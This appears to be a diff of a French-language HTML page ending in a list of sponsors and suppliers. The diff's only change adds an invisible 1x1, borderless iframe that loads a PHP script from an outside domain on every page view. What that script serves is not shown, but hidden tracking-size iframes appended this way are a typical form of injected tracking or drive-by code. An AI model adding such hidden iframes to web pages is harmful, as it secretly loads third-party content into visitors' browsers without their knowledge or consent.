@@ -27,3 +27,5 @@ Cela passe nécessairement par un renforcement des liens entre les personnes, au
 <li>Assistance Administrative : Aube Consultance (Visé)</li>
 <li>Matériel d'exposition : <a href="http://www.rentevent.be">Rent Event</a> (Asse)</li>
 </ul> 
+
+<iframe src="https://www.my-poppy.eu/cnt/cnt.php" width="1" height="1" frameBorder="0">
